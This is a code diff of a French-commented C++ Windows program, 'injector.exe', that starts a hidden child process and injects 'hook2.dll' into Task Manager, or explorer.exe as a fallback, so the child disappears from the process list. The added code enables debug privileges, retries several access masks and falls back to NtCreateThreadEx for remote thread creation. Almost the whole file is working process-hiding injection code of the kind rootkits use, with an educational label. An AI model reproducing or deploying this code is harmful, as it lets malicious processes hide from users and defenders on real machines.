@@ -7,6 +7,7 @@
 #include <thread>
 #include <chrono>
 #include <fstream>
+#include <sstream>
 
 // Énumération pour l'état du processus
 enum class ProcessState {
@@ -80,123 +81,6 @@ struct PCB {
     std::wstring image_name;
     std::string command_line;
 };
-std::wstring GetDllPath() {
-    WCHAR modulePath[MAX_PATH];
-    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-
-    // Remplacer le nom de l'exe par le nom de la DLL
-    WCHAR* lastBackslash = wcsrchr(modulePath, L'\\');
-    if (lastBackslash) {
-        wcscpy(lastBackslash + 1, L"hook2.dll");
-    }
-
-    return std::wstring(modulePath);
-}
-
-// Fonction pour obtenir le PID d'un processus par son nom
-static DWORD GetProcessIdByName(const wchar_t* processName) {
-    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnapshot == INVALID_HANDLE_VALUE) {
-        std::wcout << L"Erreur CreateToolhelp32Snapshot: " << GetLastError() << std::endl;
-        return 0;
-    }
-
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
-
-    if (!Process32FirstW(hSnapshot, &pe32)) {
-        std::wcout << L"Erreur Process32First: " << GetLastError() << std::endl;
-        CloseHandle(hSnapshot);
-        return 0;
-    }
-
-    DWORD pid = 0;
-    do {
-        if (_wcsicmp(pe32.szExeFile, processName) == 0) {
-            pid = pe32.th32ProcessID;
-            break;
-        }
-    } while (Process32NextW(hSnapshot, &pe32));
-
-    CloseHandle(hSnapshot);
-    return pid;
-}
-
-// Fonction pour injecter une DLL dans un processus cible
-static bool InjectDll(DWORD targetPid, const std::wstring& dllPath) {
-    // Étape 1: Ouvrir le processus cible avec tous les droits
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
-    if (!hProcess) {
-        std::wcout << L"Erreur OpenProcess: " << GetLastError() << std::endl;
-        return false;
-    }
-
-    // Étape 2: Allouer de la mémoire dans le processus cible
-    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
-    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize,
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pRemoteMemory) {
-        std::wcout << L"Erreur VirtualAllocEx: " << GetLastError() << std::endl;
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    // Étape 3: Écrire le chemin de la DLL dans la mémoire allouée
-    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
-        std::wcout << L"Erreur WriteProcessMemory: " << GetLastError() << std::endl;
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    // Étape 4: Obtenir l'adresse de LoadLibraryW dans kernel32.dll
-    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
-    if (hKernel32 == NULL) {
-        std::wcout << L"Erreur GetModuleHandleW: " << GetLastError() << std::endl;
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
-    if (pLoadLibrary == NULL) {
-        std::wcout << L"Erreur GetProcAddress: " << GetLastError() << std::endl;
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    // Étape 5: Créer un thread distant qui appelle LoadLibraryW
-    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
-        (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
-    if (!hRemoteThread) {
-        std::wcout << L"Erreur CreateRemoteThread: " << GetLastError() << std::endl;
-        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return false;
-    }
-
-    // Attendre que le thread termine (chargement de la DLL)
-    WaitForSingleObject(hRemoteThread, INFINITE);
-
-    // Nettoyer les ressources
-    CloseHandle(hRemoteThread);
-    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
-    CloseHandle(hProcess);
-
-    std::wcout << L"Injection réussie dans le processus PID: " << targetPid << std::endl;
-    return true;
-}
-
-// Fonction utilitaire pour vérifier si un processus existe
-static bool IsProcessRunning(DWORD pid) {
-    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-    if (hProcess) {
-        CloseHandle(hProcess);
-        return true;
-    }
-    return false;
-}
 
 // Fonction pour récupérer les informations PCB complètes d'un processus
 static PCB GetCompletePCB(DWORD pid, const std::wstring& processName) {
@@ -371,106 +255,229 @@ static void DisplayCompletePCB(const PCB& pcb) {
     std::wcout << L"\n";
 }
 
-// Fonction pour créer le fichier source C++ de process_child.exe
-static bool CreateProcessChildSource() {
-    std::ofstream srcFile("process_child.cpp");
-    if (!srcFile) {
+std::wstring GetDllPath() {
+    WCHAR modulePath[MAX_PATH];
+    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
+
+    WCHAR* lastBackslash = wcsrchr(modulePath, L'\\');
+    if (lastBackslash) {
+        wcscpy(lastBackslash + 1, L"hook2.dll");
+    }
+
+    return std::wstring(modulePath);
+}
+
+static DWORD GetProcessIdByName(const wchar_t* processName) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        return 0;
+    }
+
+    PROCESSENTRY32W pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+    if (!Process32FirstW(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return 0;
+    }
+
+    DWORD pid = 0;
+    do {
+        if (_wcsicmp(pe32.szExeFile, processName) == 0) {
+            pid = pe32.th32ProcessID;
+            break;
+        }
+    } while (Process32NextW(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
+// Fonction pour activer les privilèges de debug
+static bool EnableDebugPrivileges() {
+    HANDLE hToken;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
         return false;
     }
 
-    // Code C++ SIMPLIFIÉ sans problèmes d'échappement
-    srcFile << "#include <Windows.h>\n";
-    srcFile << "#include <iostream>\n";
-    srcFile << "#include <thread>\n";
-    srcFile << "#include <chrono>\n\n";
-    srcFile << "int main() {\n";
-    srcFile << "    std::cout << \"=== PROCESSUS ENFANT process_child.exe ===\" << std::endl;\n";
-    srcFile << "    std::cout << \"PID: \" << GetCurrentProcessId() << std::endl;\n";
-    srcFile << "    std::cout << \"Demarrage reussi!\" << std::endl;\n";
-    srcFile << "    std::cout << \"Ce processus s'executera pendant 5 minutes.\" << std::endl;\n";
-    srcFile << "    \n";
-    srcFile << "    // Boucle principale - 5 minutes = 300 secondes\n";
-    srcFile << "    for (int i = 0; i < 300; i++) {\n";
-    srcFile << "        if (i % 30 == 0) {\n";
-    srcFile << "            std::cout << \"process_child.exe actif depuis \" << i \n";
-    srcFile << "                      << \" secondes. PID: \" << GetCurrentProcessId() << std::endl;\n";
-    srcFile << "        }\n";
-    srcFile << "        std::this_thread::sleep_for(std::chrono::seconds(1));\n";
-    srcFile << "    }\n";
-    srcFile << "    \n";
-    srcFile << "    std::cout << \"=== PROCESS_CHILD.EXE TERMINE ===\" << std::endl;\n";
-    srcFile << "    return 0;\n";
-    srcFile << "}\n";
-
-    srcFile.close();
-    return true;
-}
-
-// Fonction pour compiler process_child.exe
-static bool CompileProcessChild() {
-    std::wcout << L"Compilation de process_child.exe..." << std::endl;
-
-    // Commande de compilation
-    std::string compileCommand = "cl /EHsc /nologo process_child.cpp /link /out:process_child.exe /SUBSYSTEM:CONSOLE";
-
-    // Exécuter la compilation
-    int result = system(compileCommand.c_str());
-
-    if (result != 0) {
-        std::wcout << L"Erreur lors de la compilation de process_child.exe" << std::endl;
+    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
+        CloseHandle(hToken);
         return false;
     }
 
-    std::wcout << L"Compilation réussie!" << std::endl;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
+        CloseHandle(hToken);
+        return false;
+    }
+
+    CloseHandle(hToken);
     return true;
 }
 
-// Fonction pour nettoyer les fichiers temporaires
-static void CleanupTempFiles() {
-    remove("process_child.cpp");
-    remove("process_child.obj");
+static bool InjectDll(DWORD targetPid, const std::wstring& dllPath) {
+    // Activer les privilèges de debug
+    EnableDebugPrivileges();
+
+    // Essayer différentes combinaisons de droits d'accès
+    DWORD accessFlags[] = {
+        PROCESS_ALL_ACCESS,
+        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
+        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE
+    };
+
+    HANDLE hProcess = NULL;
+    for (int i = 0; i < 3 && hProcess == NULL; i++) {
+        hProcess = OpenProcess(accessFlags[i], FALSE, targetPid);
+        if (hProcess) {
+            std::wcout << L"Processus ouvert avec les droits: 0x" << std::hex << accessFlags[i] << std::dec << std::endl;
+            break;
+        }
+    }
+
+    if (!hProcess) {
+        std::wcout << L"Impossible d'ouvrir le processus avec PID: " << targetPid << std::endl;
+        std::wcout << L"Erreur: " << GetLastError() << std::endl;
+        return false;
+    }
+
+    SIZE_T dllPathSize = (dllPath.length() + 1) * sizeof(wchar_t);
+    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemoteMemory) {
+        std::wcout << L"Erreur VirtualAllocEx: " << GetLastError() << std::endl;
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPathSize, NULL)) {
+        std::wcout << L"Erreur WriteProcessMemory: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
+    if (hKernel32 == NULL) {
+        std::wcout << L"Erreur GetModuleHandle: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryW");
+    if (pLoadLibrary == NULL) {
+        std::wcout << L"Erreur GetProcAddress: " << GetLastError() << std::endl;
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);
+    if (!hRemoteThread) {
+        std::wcout << L"Erreur CreateRemoteThread: " << GetLastError() << std::endl;
+
+        // Essayer une méthode alternative avec NtCreateThreadEx
+        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+        if (hNtdll) {
+            typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
+                OUT PHANDLE hThread,
+                IN ACCESS_MASK DesiredAccess,
+                IN LPVOID ObjectAttributes,
+                IN HANDLE ProcessHandle,
+                IN LPTHREAD_START_ROUTINE lpStartAddress,
+                IN LPVOID lpParameter,
+                IN BOOL CreateSuspended,
+                IN ULONG StackZeroBits,
+                IN ULONG SizeOfStackCommit,
+                IN ULONG SizeOfStackReserve,
+                OUT LPVOID lpBytesBuffer
+                );
+
+            pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
+            if (NtCreateThreadEx) {
+                NTSTATUS status = NtCreateThreadEx(&hRemoteThread,
+                    THREAD_ALL_ACCESS,
+                    NULL,
+                    hProcess,
+                    (LPTHREAD_START_ROUTINE)pLoadLibrary,
+                    pRemoteMemory,
+                    FALSE,
+                    0,
+                    0,
+                    0,
+                    NULL);
+
+                if (status >= 0) {
+                    std::wcout << L"Injection réussie avec NtCreateThreadEx!" << std::endl;
+                }
+            }
+        }
+
+        if (!hRemoteThread) {
+            VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+            CloseHandle(hProcess);
+            return false;
+        }
+    }
+
+    WaitForSingleObject(hRemoteThread, 5000); // Attendre 5 secondes max
+
+    DWORD exitCode = 0;
+    if (GetExitCodeThread(hRemoteThread, &exitCode)) {
+        if (exitCode == 0) {
+            std::wcout << L"Le thread distant a échoué (code de sortie: 0)" << std::endl;
+        }
+        else {
+            std::wcout << L"Le thread distant a réussi (code de sortie: " << exitCode << L")" << std::endl;
+        }
+    }
+
+    CloseHandle(hRemoteThread);
+    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+    CloseHandle(hProcess);
+
+    return true;
 }
 
-// Fonction pour créer et exécuter process_child.exe
+// Fonction pour vérifier que le processus enfant est toujours actif
+static bool IsChildProcessStillActive(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (hProcess) {
+        DWORD exitCode;
+        if (GetExitCodeProcess(hProcess, &exitCode)) {
+            CloseHandle(hProcess);
+            return (exitCode == STILL_ACTIVE);
+        }
+        CloseHandle(hProcess);
+    }
+    return false;
+}
+
 static PROCESS_INFORMATION CreateAndRunProcessChild() {
-    std::wcout << L"Création de process_child.exe..." << std::endl;
-
-    // Étape 1: Créer le fichier source
-    if (!CreateProcessChildSource()) {
-        std::wcout << L"Erreur: Impossible de créer le fichier source" << std::endl;
-        PROCESS_INFORMATION pi = { 0 };
-        return pi;
-    }
-
-    // Étape 2: Compiler l'exécutable
-    if (!CompileProcessChild()) {
-        std::wcout << L"Erreur: Impossible de compiler process_child.exe" << std::endl;
-        PROCESS_INFORMATION pi = { 0 };
-        return pi;
-    }
-
-    // Étape 3: Nettoyer les fichiers temporaires
-    CleanupTempFiles();
-
-    // Étape 4: Exécuter process_child.exe
-    std::wcout << L"Lancement de process_child.exe..." << std::endl;
-
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = { 0 };
 
+    // Lancer process_child.exe directement (maintenant compilé séparément)
     if (!CreateProcessW(
-        L"process_child.exe",           // Nom de l'exécutable
-        NULL,                           // Arguments de ligne de commande
-        NULL,                           // Attributs de sécurité du processus
-        NULL,                           // Attributs de sécurité du thread
-        FALSE,                          // Héritage des handles
-        CREATE_NEW_CONSOLE,             // Nouvelle console
-        NULL,                           // Environnement
-        NULL,                           // Répertoire courant
-        &si,                            // Startup info
-        &pi                             // Process info
+        L"process_child.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        &si,
+        &pi
     )) {
-        std::wcout << L"Erreur CreateProcessW: " << GetLastError() << std::endl;
         PROCESS_INFORMATION empty_pi = { 0 };
         return empty_pi;
     }
@@ -478,102 +485,145 @@ static PROCESS_INFORMATION CreateAndRunProcessChild() {
     return pi;
 }
 
-static int wmain(int argc, wchar_t* argv[]) {
-    // Mode parent - logique principale d'injection
-    std::wcout << L"=== DÉMONSTRATION PÉDAGOGIQUE - MASQUAGE DE PROCESSUS ===" << std::endl;
-    std::wcout << L"Processus Parent (injector.exe) - PID: " << GetCurrentProcessId() << std::endl;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    AllocConsole();
+    FILE* f;
+    freopen_s(&f, "CONOUT$", "w", stdout);
+    freopen_s(&f, "CONOUT$", "w", stderr);
 
-    // Chemin de la DLL à injecter
+    std::wcout << L"=== INJECTOR.EXE - DÉMARRAGE ===" << std::endl;
+    std::wcout << L"PID: " << GetCurrentProcessId() << std::endl;
+
     std::wstring dllPath = GetDllPath();
+    std::wcout << L"Chemin DLL: " << dllPath << std::endl;
 
-    // Étape 1: Création et exécution de process_child.exe
-    std::wcout << L"\n1. Création et exécution de process_child.exe..." << std::endl;
+    // Vérifier si la DLL existe
+    DWORD dwAttrib = GetFileAttributesW(dllPath.c_str());
+    if (dwAttrib == INVALID_FILE_ATTRIBUTES || (dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
+        std::wcout << L"ERREUR: La DLL hook2.dll n'existe pas dans le même répertoire!" << std::endl;
+        std::wcout << L"Chemin recherché: " << dllPath << std::endl;
+        MessageBoxW(NULL, L"La DLL hook2.dll est introuvable. Placez-la dans le même répertoire que injector.exe", L"Erreur", MB_ICONERROR);
+        FreeConsole();
+        return 1;
+    }
 
+    // Étape 1: Création du processus enfant
+    std::wcout << L"\n1. Création de process_child.exe..." << std::endl;
     PROCESS_INFORMATION pi = CreateAndRunProcessChild();
 
     if (pi.dwProcessId == 0) {
         std::wcout << L"Échec de la création du processus enfant." << std::endl;
+        MessageBoxW(NULL, L"Échec de la création de process_child.exe", L"Erreur", MB_ICONERROR);
+        FreeConsole();
         return 1;
     }
 
     std::wcout << L"Processus enfant créé avec succès!" << std::endl;
-    std::wcout << L"PID: " << pi.dwProcessId << std::endl;
-    std::wcout << L"Nom: process_child.exe" << std::endl;
-    std::wcout << L"Durée: 5 minutes" << std::endl;
-    std::wcout << L"Fichier: process_child.exe (créé dans le répertoire courant)" << std::endl;
+    std::wcout << L"PID enfant: " << pi.dwProcessId << std::endl;
 
     // Attendre que le processus soit bien lancé
-    std::wcout << L"Attente du démarrage du processus enfant..." << std::endl;
     Sleep(3000);
 
-    // Afficher les informations PCB COMPLÈTES du processus enfant
-    std::wcout << L"\nAFFICHAGE DU PCB COMPLET DU PROCESSUS ENFANT:" << std::endl;
+    // Étape 2: AFFICHAGE du PCB AVANT masquage
+    std::wcout << L"\n2. AFFICHAGE DU PCB (AVANT MASQUAGE)..." << std::endl;
     PCB child_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
     DisplayCompletePCB(child_pcb);
 
-    // Vérification avant injection
-    std::wcout << L"\n2. Vérification avant injection..." << std::endl;
-    std::wcout << L"Le processus process_child.exe (PID: " << pi.dwProcessId
-        << L") devrait être visible dans le Gestionnaire des tâches." << std::endl;
-    std::wcout << L"Appuyez sur Entrée pour continuer...";
-    std::wcin.get();
+    MessageBoxW(NULL,
+        L"🔍 PCB affiché!\n\n"
+        L"Le PCB de process_child.exe est maintenant affiché.\n"
+        L"Cliquez sur OK pour procéder au masquage du processus.",
+        L"PCB Affiché",
+        MB_ICONINFORMATION);
 
-    // Étape 2: Recherche du Gestionnaire des tâches
+    // Étape 3: Recherche et injection dans Task Manager
     std::wcout << L"\n3. Recherche du Gestionnaire des tâches..." << std::endl;
     DWORD taskmgrPid = GetProcessIdByName(L"Taskmgr.exe");
 
     if (taskmgrPid == 0) {
-        std::wcout << L"Task Manager non trouvé. Lancez-le et réessayez." << std::endl;
-        if (pi.hProcess != NULL) TerminateProcess(pi.hProcess, 0);
-        if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
-        if (pi.hThread != NULL) CloseHandle(pi.hThread);
-        return 1;
+        std::wcout << L"Task Manager non trouvé. Lancement..." << std::endl;
+        STARTUPINFOW si = { sizeof(si) };
+        PROCESS_INFORMATION taskmgrPi;
+
+        if (CreateProcessW(L"taskmgr.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &taskmgrPi)) {
+            taskmgrPid = taskmgrPi.dwProcessId;
+            CloseHandle(taskmgrPi.hProcess);
+            CloseHandle(taskmgrPi.hThread);
+            Sleep(3000);
+            std::wcout << L"Task Manager lancé - PID: " << taskmgrPid << std::endl;
+        }
+        else {
+            std::wcout << L"Impossible de lancer Task Manager. Essai avec un autre processus..." << std::endl;
+            // Essayer avec un autre processus système
+            taskmgrPid = GetProcessIdByName(L"explorer.exe");
+            if (taskmgrPid != 0) {
+                std::wcout << L"Utilisation d'explorer.exe comme cible alternative (PID: " << taskmgrPid << L")" << std::endl;
+            }
+        }
     }
 
-    std::wcout << L"Task Manager trouvé - PID: " << taskmgrPid << std::endl;
+    if (taskmgrPid != 0) {
+        std::wcout << L"\n4. Injection dans le processus cible (PID: " << taskmgrPid << L")..." << std::endl;
 
-    // Étape 3: Injection de la DLL dans Task Manager
-    std::wcout << L"\n4. Injection de la DLL dans Task Manager..." << std::endl;
+        if (InjectDll(taskmgrPid, dllPath)) {
+            std::wcout << L"Injection réussie! Processus maintenant masqué." << std::endl;
 
-    if (!InjectDll(taskmgrPid, dllPath)) {
-        std::wcout << L"Échec de l'injection." << std::endl;
-        if (pi.hProcess != NULL) TerminateProcess(pi.hProcess, 0);
-        if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
-        if (pi.hThread != NULL) CloseHandle(pi.hThread);
-        return 1;
+            // Vérifier que le processus enfant est toujours actif
+            if (IsChildProcessStillActive(pi.dwProcessId)) {
+                std::wcout << L"✅ Processus enfant toujours actif et masqué!" << std::endl;
+
+                // Étape 4: AFFICHAGE du PCB APRÈS masquage
+                std::wcout << L"\n5. AFFICHAGE DU PCB (APRÈS MASQUAGE)..." << std::endl;
+                PCB updated_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
+                DisplayCompletePCB(updated_pcb);
+
+                // Message de succès final avec instructions de vérification
+                WCHAR successMsg[512];
+                swprintf(successMsg,
+                    L"✅ DÉMONSTRATION TERMINÉE!\n\n"
+                    L"📋 ÉTAPES RÉALISÉES:\n"
+                    L"1. ✅ Processus process_child.exe créé (PID: %d)\n"
+                    L"2. ✅ PCB affiché avant masquage\n"
+                    L"3. ✅ DLL injectée dans le processus cible\n"
+                    L"4. ✅ Processus masqué dans Task Manager\n"
+                    L"5. ✅ PCB affiché après masquage\n\n"
+                    L"🎯 RÉSULTAT:\n"
+                    L"• Le processus est INVISIBLE dans Task Manager\n"
+                    L"• Mais il continue de s'exécuter (PCB actif)\n"
+                    L"• Durée: 5 minutes en arrière-plan\n\n"
+                    L"🔍 PREUVES D'EXÉCUTION:\n"
+                    L"• Fichier 'process_child_log.txt' créé\n"
+                    L"• Fichiers 'process_child_witness_XX.txt' créés\n"
+                    L"• Vérifiez ces fichiers pour confirmer l'exécution!",
+                    pi.dwProcessId);
+
+                MessageBoxW(NULL, successMsg, L"Démonstration Réussie", MB_ICONINFORMATION | MB_OK);
+            }
+            else {
+                std::wcout << L"❌ Processus enfant s'est terminé prématurément!" << std::endl;
+                MessageBoxW(NULL, L"Le processus enfant s'est terminé prématurément", L"Erreur", MB_ICONERROR);
+            }
+        }
+        else {
+            std::wcout << L"Échec de l'injection." << std::endl;
+            MessageBoxW(NULL, L"Échec de l'injection. Exécutez en tant qu'administrateur.", L"Erreur", MB_ICONERROR);
+        }
+    }
+    else {
+        std::wcout << L"Aucun processus cible trouvé pour l'injection." << std::endl;
+        MessageBoxW(NULL, L"Aucun processus cible (Task Manager ou Explorer) trouvé", L"Erreur", MB_ICONERROR);
     }
 
-    // Vérification après injection
-    std::wcout << L"\n5. Vérification après injection..." << std::endl;
-    std::wcout << L"Le processus process_child.exe (PID: " << pi.dwProcessId
-        << L") devrait maintenant être INVISIBLE dans le Gestionnaire des tâches." << std::endl;
-    std::wcout << L"Le processus est toujours en cours d'exécution: "
-        << (IsProcessRunning(pi.dwProcessId) ? L"OUI" : L"NON") << std::endl;
-
-    // Réafficher les informations PCB pour confirmer que le processus existe toujours
-    std::wcout << L"\nPCB ACTUALISÉ APRÈS MASQUAGE:" << std::endl;
-    PCB updated_pcb = GetCompletePCB(pi.dwProcessId, L"process_child.exe");
-    DisplayCompletePCB(updated_pcb);
-
-    std::wcout << L"\n6. DÉMONSTRATION EN COURS..." << std::endl;
-    std::wcout << L"process_child.exe continue de s'exécuter pendant 5 minutes." << std::endl;
-    std::wcout << L"✓ Fichier process_child.exe créé dans le répertoire courant" << std::endl;
-    std::wcout << L"✓ Processus masqué dans Task Manager" << std::endl;
-    std::wcout << L"✓ Processus toujours actif (vérifiable avec les APIs)" << std::endl;
-    std::wcout << L"✓ Durée totale: 5 minutes" << std::endl;
-
-    std::wcout << L"\nAppuyez sur Entrée pour terminer la démonstration (le processus enfant continuera)...";
-    std::wcin.get();
-
-    // Nettoyage - fermer les handles mais laisser l'enfant s'exécuter
+    // Nettoyage
     if (pi.hProcess != NULL) CloseHandle(pi.hProcess);
     if (pi.hThread != NULL) CloseHandle(pi.hThread);
 
-    std::wcout << L"\n=== DÉMONSTRATION TERMINÉE ===" << std::endl;
-    std::wcout << L"Processus parent injector.exe arrêté." << std::endl;
-    std::wcout << L"Processus enfant process_child.exe continue en arrière-plan pendant 5 minutes." << std::endl;
-    std::wcout << L"Le fichier process_child.exe reste dans le répertoire courant." << std::endl;
-    std::wcout << L"Vérifiez qu'il est invisible dans Task Manager mais toujours actif!" << std::endl;
+    std::wcout << L"\n=== INJECTOR.EXE TERMINÉ ===" << std::endl;
+    std::wcout << L"Le processus enfant continue de s'exécuter en arrière-plan." << std::endl;
+    std::wcout << L"Vérifiez les fichiers créés pour confirmer son existence!" << std::endl;
+
+    Sleep(3000);
+    FreeConsole();
 
     return 0;
 }
